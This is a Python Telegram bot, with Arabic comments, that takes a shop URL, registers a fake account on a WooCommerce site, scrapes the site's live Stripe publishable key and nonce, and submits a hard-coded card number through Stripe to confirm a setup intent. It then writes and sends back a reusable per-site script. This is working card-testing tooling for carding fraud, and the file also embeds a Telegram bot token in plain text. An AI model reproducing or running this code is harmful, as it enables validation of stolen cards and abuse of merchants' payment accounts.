import requests
import re
import random
import time
import os
from urllib.parse import urlparse

BOT_TOKEN = "8735160085:AAE6irTw7GANrb6MugJnTu8fFTPkAAlr1O8"
last_update_id = 0

def generate_python_file(target_url, email, pk_live, addnonce, payment_id, gateway_response):
    parsed = urlparse(target_url)
    domain = parsed.netloc
    
    filename = f"gateway_{domain}.py"
    
    content = f'''import requests , re,random
from urllib.parse import urlparse

r=requests.session()
url = "{target_url}"
pa= urlparse(url)
urll = f"{{pa.scheme}}://{{pa.netloc}}"

email = f"{email}"

headers = {{
    'authority': '{domain}',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}}

response = r.get(f'{{urll}}/my-account/add-payment-method/', headers=headers)
reg  = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

headers = {{
    'authority': '{domain}',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}}

data = {{
    'email': email,
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'woocommerce-register-nonce': reg,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}}

response = r.post(f'{{urll}}/my-account/add-payment-method/', headers=headers, data=data)

if ' An account is already registered with' in response.text:
    print('❌')
else:
    print('✅')
    response = r.get(f'{{urll}}/my-account/add-payment-method/', headers=headers)
    pk_live = re.search(r'(pk_live_[a-zA-Z0-9]+)' , response.text).group(1)
    print(pk_live)
    addnonce = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
    print(addnonce)
    
    headers = {{
        'authority': 'api.stripe.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }}
    
    data = f'type=card&card[number]=5258+5560+4166+8640&card[cvc]=111&card[exp_year]=25&card[exp_month]=12&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent&key={{pk_live}}'
    
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    # التحقق من وجود id في الرد
    if 'id' in response.json():
        payment_id = response.json()['id']
        print(payment_id)
    else:
        print("Stripe Error:", response.text)
        payment_id = "Failed to get payment ID"
    
    headers = {{
        'authority': '{domain}',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }}
    
    data = {{
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': addnonce,
    }}
    
    response = r.post(f'{{urll}}/wp-admin/admin-ajax.php', headers=headers, data=data)
    print(response.text)
'''
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return filename

def run_code(target_url):
    try:
        r = requests.session()
        pa = urlparse(target_url)
        urll = f"{pa.scheme}://{pa.netloc}"
        
        email = f"userjajaj{random.randint(1000,9999)}@gmail.com"
        
        headers = {
            'authority': pa.netloc,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(f'{urll}/my-account/add-payment-method/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
        
        headers = {
            'authority': pa.netloc,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'email': email,
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        
        response = r.post(f'{urll}/my-account/add-payment-method/', headers=headers, data=data)
        
        if 'An account is already registered with' in response.text:
            return None, f"❌ الايميل موجود: {email}"
        
        response = r.get(f'{urll}/my-account/add-payment-method/', headers=headers)
        pk_live = re.search(r'(pk_live_[a-zA-Z0-9]+)', response.text).group(1)
        addnonce = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        
        headers = {
            'authority': 'api.stripe.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&card[number]=5258+5560+4166+8640&card[cvc]=111&card[exp_year]=25&card[exp_month]=12&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent&key={pk_live}'
        
        stripe_response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=stripe_data)
        stripe_json = stripe_response.json()
        
        # التحقق من وجود id
        if 'id' not in stripe_json:
            error_msg = stripe_json.get('error', {}).get('message', 'Unknown error')
            return None, f"❌ Stripe Error: {error_msg}\n\nFull response: {stripe_response.text}"
        
        payment_id = stripe_json['id']
        
        headers = {
            'authority': pa.netloc,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        
        final_response = r.post(f'{urll}/wp-admin/admin-ajax.php', headers=headers, data=ajax_data)
        
        filename = generate_python_file(target_url, email, pk_live, addnonce, payment_id, final_response.text)
        
        result_msg = f"""✅ Create an account ✔️

link: {target_url}

📧 Email: {email}
🔑 pk: {pk_live}
🎫 nonce: {addnonce}
💳 id: {payment_id}

📝 Gateway Response:
{final_response.text}

📁 File: {filename}
"""
        
        return filename, result_msg
        
    except Exception as e:
        return None, f"❌ Error: {str(e)}"

def send_file(chat_id, file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={'chat_id': chat_id})
        return True
    except:
        return False

def send_msg(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text})
    except:
        pass

def get_updates():
    global last_update_id
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    try:
        resp = requests.get(url, params={"offset": last_update_id + 1, "timeout": 30})
        return resp.json().get("result", [])
    except:
        return []

print("🤖 Bot is running...")

while True:
    try:
        updates = get_updates()
        for update in updates:
            last_update_id = update["update_id"]
            if "message" in update:
                msg = update["message"]
                chat_id = msg["chat"]["id"]
                text = msg.get("text", "")
                
                if text == "/start":
                    send_msg(chat_id, "Send me a link")
                
                elif text.startswith(("http://", "https://")):
                    send_msg(chat_id, f"Processing: {text}")
                    filename, result = run_code(text)
                    send_msg(chat_id, result)
                    
                    if filename and os.path.exists(filename):
                        time.sleep(1)
                        send_file(chat_id, filename)
        
        time.sleep(1)
    except:
        time.sleep(3)